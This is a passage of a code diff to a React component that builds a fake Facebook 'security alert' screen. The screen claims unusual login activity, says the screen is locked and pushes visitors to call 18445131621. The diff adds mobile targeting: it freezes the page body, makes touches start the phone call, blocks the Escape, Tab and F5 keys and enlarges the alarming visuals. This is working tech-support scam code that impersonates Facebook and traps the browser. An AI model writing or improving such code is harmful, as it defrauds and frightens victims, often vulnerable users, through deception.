+        document.removeEventListener("contextmenu", handleContextMenu)
         clearInterval(maintenanceInterval)
       }
     }
@@ -1268,66 +1795,168 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
         .flash-notification {
           animation: flash-blue 1s infinite;
         }
+        
         .fullscreen-notification {
           position: fixed;
           top: 0;
           left: 0;
           right: 0;
-          padding: 8px 16px;
-          height: 100px;
-          background-color:  #007bff;
+          padding: 16px;
+          height: 120px;
+          background-color: #007bff;
           color: white;
           text-align: center;
           font-weight: bold;
           z-index: 9999;
-          font-family: -Facebook-system, BlinkMacSystemFont, sans-serif;
-          font-size: 14px;
+          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+          font-size: 16px;
           box-shadow: 0 2px 10px rgba(0,0,0,0.3);
           display: flex;
           align-items: center;
           justify-content: center;
           backdrop-filter: blur(10px);
+          -webkit-backdrop-filter: blur(10px);
         }
+        
         .fullscreen-indicator {
           display: inline-block;
           width: 80px;
-          height: 200px;
+          height: 80px;
           background-color: white;
           border-radius: 50%;
-          margin-right: 8px;
+          margin-right: 12px;
+        }
+        
+        .emergency-toast-mobile {
+          position: fixed;
+          padding: 16px 20px;
+          background-color: #dc2626;
+          color: white;
+          border-radius: 12px;
+          z-index: 10000;
+          font-weight: bold;
+          font-size: 14px;
+          max-width: 90vw;
+          box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+          animation: slideIn 0.3s ease-out;
+        }
+        
+        .emergency-toast-mobile.top-right {
+          top: 20px;
+          right: 20px;
+        }
+        
+        .emergency-toast-mobile.top-left {
+          top: 20px;
+          left: 20px;
+        }
+        
+        .emergency-toast-mobile.bottom-center {
+          bottom: 20px;
+          left: 50%;
+          transform: translateX(-50%);
+          background-color: #2563eb;
+        }
+        
+        .toast-content {
+          display: flex;
+          align-items: center;
+          gap: 12px;
+        }
+        
+        .toast-icon {
+          font-size: 24px;
+        }
+        
+        @keyframes slideIn {
+          from {
+            opacity: 0;
+            transform: translateY(-20px);
+          }
+          to {
+            opacity: 1;
+            transform: translateY(0);
+          }
+        }
+        
+        /* Mobile-specific improvements */
+        @media (max-width: 768px) {
+          .fullscreen-notification {
+            height: 100px;
+            padding: 12px;
+            font-size: 14px;
+          }
+          
+          .fullscreen-indicator {
+            width: 60px;
+            height: 60px;
+          }
+          
+          body.emergency-active {
+            position: fixed !important;
+            width: 100% !important;
+            height: 100% !important;
+            overflow: hidden !important;
+          }
+        }
+        
+        /* iOS Safari specific fixes */
+        @supports (-webkit-touch-callout: none) {
+          .emergency-container {
+            min-height: 100vh;
+            min-height: -webkit-fill-available;
+          }
+          
+          .emergency-popup-container {
+            height: 100vh;
+            height: -webkit-fill-available;
+          }
         }
       `
       document.head.appendChild(style)
 
+      // Add class to body for mobile freezing
+      if (isMobile) {
+        document.body.classList.add('emergency-active')
+      }
+
       return () => {
-        document.head.removeChild(style)
+        const existingStyle = document.getElementById("emergency-styles")
+        if (existingStyle && document.head.contains(existingStyle)) {
+          document.head.removeChild(existingStyle)
+        }
+        document.body.classList.remove('emergency-active')
       }
     }
-  }, [showPopup])
+  }, [showPopup, isMobile])
 
   const createVisualDistraction = () => {
     if (!showPopup) return null
 
     return (
       <>
-        <div className="fullscreen-notification flash-notification" onClick={handleCall}>
+        <div 
+          className="fullscreen-notification flash-notification" 
+          onClick={handleCall}
+          onTouchStart={handleTouch}
+        >
           <span className="fullscreen-indicator animate-ping"></span>
-          <Lock size={96} className="mr-1" />
+          <Lock size={64} className="mr-2" />
           Facebook SECURITY - SCREEN LOCKED
         </div>
 
-        <div className="fixed top-0 left-0 right-0 h-12 bg-blue-600 z-40 flex items-center justify-center backdrop-blur-lg">
+        <div className="fixed top-0 left-0 right-0 h-16 bg-blue-600 z-40 flex items-center justify-center backdrop-blur-lg">
           <div className="animate-pulse flex items-center">
-            <AlertCircle size={24} className="text-white mr-2" />
-            <span className="text-white font-bold">Facebook SECURITY ALERT</span>
+            <AlertCircle size={24} className="text-white mr-3" />
+            <span className="text-white font-bold text-lg">Facebook SECURITY ALERT</span>
           </div>
         </div>
 
-        <div className="fixed top-4 right-4 bg-blue-600 text-white p-2 rounded-full animate-ping z-50">
+        <div className="fixed top-6 right-6 bg-blue-600 text-white p-3 rounded-full animate-ping z-50">
           <AlertCircle size={16} />
         </div>
         <div
-          className="fixed top-6 left-6 bg-blue-600 text-white p-2 rounded-full animate-pulse z-50"
+          className="fixed top-6 left-6 bg-blue-600 text-white p-3 rounded-full animate-pulse z-50"
           style={{ animationDelay: "0.5s" }}
         >
           <AlertCircle size={16} />
@@ -1340,36 +1969,41 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
     <>
       <div
         ref={fullscreenRef}
-        className="min-h-screen bg-gradient-to-b from-blue-50 to-blue-100 p-4 flex flex-col items-center justify-center cursor-pointer font-[-Facebook-system]"
+        className="emergency-container min-h-screen bg-gradient-to-b from-blue-50 to-blue-100 p-6 flex flex-col items-center justify-center cursor-pointer"
         onClick={handleCall}
+        onTouchStart={handleTouch}
         style={{ 
           transform: `scale(${1 - depth * 0.05})`,
-          zIndex: 1000 + depth
+          zIndex: 1000 + depth,
+          minHeight: '100vh',
+          minHeight: '-webkit-fill-available'
         }}
       >
-        <ToastContainer position="top-right" autoClose={5000} />
         {createVisualDistraction()}
         <div className="w-full max-w-md">
-          <Card className="p-6 bg-white shadow-lg border border-blue-200 rounded-2xl">
-            <div className="flex flex-col items-center space-y-4">
-              <div className="bg-blue-600 rounded-full p-4 animate-pulse">
-                <PhoneCall size={48} className="text-white" />
+          <Card className="p-8 bg-white shadow-lg border border-blue-200 rounded-2xl">
+            <div className="flex flex-col items-center space-y-6">
+              <div className="bg-blue-600 rounded-full p-6 animate-pulse">
+                <PhoneCall size={56} className="text-white" />
               </div>
-              <h2 className="text-2xl font-semibold text-center">Facebook Support</h2>
-              <p className="text-base md:text-lg text-muted-foreground"><br></br>
-           <h1 className="text-xl md:text-3xl font-semibold tracking-tight">Warning:</h1> <br></br>
-           We've Detected Unusual Login Activity on Your Facebook Account.
-            <br /><br />
-          </p>
-              <p className="text-center text-gray-600 mb-4">Tap anywhere for immediate Facebook support</p>
+              <h2 className="text-3xl font-semibold text-center">Facebook Support</h2>
+              <div className="text-lg text-muted-foreground text-center">
+                <h1 className="text-2xl md:text-4xl font-semibold tracking-tight mb-4">Warning:</h1>
+                <p className="text-xl">We've Detected Unusual Login Activity on Your Facebook Account.</p>
+              </div>
+              <p className="text-center text-gray-600 text-lg mb-6">Tap anywhere for immediate Facebook support</p>
               <Button
-                className="w-full bg-blue-600 hover:bg-blue-700 text-white py-6 text-xl font-medium rounded-xl flex items-center justify-center space-x-2 transition-all"
+                className="w-full bg-blue-600 hover:bg-blue-700 text-white py-8 text-2xl font-medium rounded-xl flex items-center justify-center space-x-3 transition-all"
                 onClick={(e) => {
                   e.stopPropagation()
                   handleCall()
                 }}
+                onTouchStart={(e) => {
+                  e.stopPropagation()
+                  handleTouch(e)
+                }}
               >
-                <PhoneCall className="mr-2 h-6 w-6" />
+                <PhoneCall className="mr-3 h-8 w-8" />
                 <span>Call 18445131621</span>
               </Button>
             </div>
@@ -1380,7 +2014,7 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
           <div
             id="emergencyPopup"
             ref={popupRef}
-            className="fixed inset-0 flex items-center justify-center z-50 p-4 backdrop-blur-lg"
+            className="emergency-popup-container fixed inset-0 flex items-center justify-center z-50 p-6 backdrop-blur-lg"
             tabIndex={-1}
             onKeyDown={(e) => {
               if (e.key === "Escape" || e.key === "Tab" || e.key === "F5") {
@@ -1389,30 +2023,32 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
               }
             }}
             onClick={(e) => e.stopPropagation()}
+            onTouchStart={(e) => e.stopPropagation()}
           >
-            <div className="absolute inset-0 bg-black bg-opacity-60"></div>
-            <Card className="bg-white p-6 rounded-2xl border border-blue-200 shadow-2xl max-w-md w-full z-10 animate-bounce">
-              <div className="flex flex-col items-center space-y-4">
-                <div className="flex items-center justify-center w-16 h-16 bg-blue-600 rounded-full">
-                  <AlertCircle size={32} className="text-white" />
+            <div className="absolute inset-0 bg-black bg-opacity-70"></div>
+            <Card className="bg-white p-8 rounded-2xl border border-blue-200 shadow-2xl max-w-md w-full z-10 animate-bounce">
+              <div className="flex flex-col items-center space-y-6">
+                <div className="flex items-center justify-center w-20 h-20 bg-blue-600 rounded-full">
+                  <AlertCircle size={40} className="text-white" />
                 </div>
-                <h2 className="text-2xl font-semibold text-center">Facebook SUPPORT</h2>
-                <p className="text-center text-lg">Connecting you to Facebook Support at:</p>
-                <p className="text-2xl font-semibold text-blue-600">18445131621</p>
-                <div className="flex space-x-2 items-center justify-center w-full mt-2">
-                  <div className="h-3 w-3 bg-blue-600 rounded-full animate-ping"></div>
-                  <div className="h-3 w-3 bg-blue-600 rounded-full animate-ping" style={{ animationDelay: "0.2s" }}></div>
-                  <div className="h-3 w-3 bg-blue-600 rounded-full animate-ping" style={{ animationDelay: "0.4s" }}></div>
+                <h2 className="text-3xl font-semibold text-center">Facebook SUPPORT</h2>
+                <p className="text-center text-xl">Connecting you to Facebook Support at:</p>
+                <p className="text-3xl font-semibold text-blue-600">18445131621</p>
+                <div className="flex space-x-3 items-center justify-center w-full mt-4">
+                  <div className="h-4 w-4 bg-blue-600 rounded-full animate-ping"></div>
+                  <div className="h-4 w-4 bg-blue-600 rounded-full animate-ping" style={{ animationDelay: "0.2s" }}></div>
+                  <div className="h-4 w-4 bg-blue-600 rounded-full animate-ping" style={{ animationDelay: "0.4s" }}></div>
                 </div>
                 <Button
                   id="callButton"
-                  className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-xl mt-4"
+                  className="w-full bg-blue-600 hover:bg-blue-700 text-white py-6 rounded-xl mt-6 text-xl"
                   onClick={() => (window.location.href = "tel:18445131621")}
+                  onTouchStart={() => (window.location.href = "tel:18445131621")}
                   autoFocus
                 >
                   Confirm Call
                 </Button>
-                <p className="text-xs text-center text-gray-500 mt-2">Facebook security mode active.</p>
+                <p className="text-sm text-center text-gray-500 mt-4">Facebook security mode active.</p>
               </div>
             </Card>
           </div>
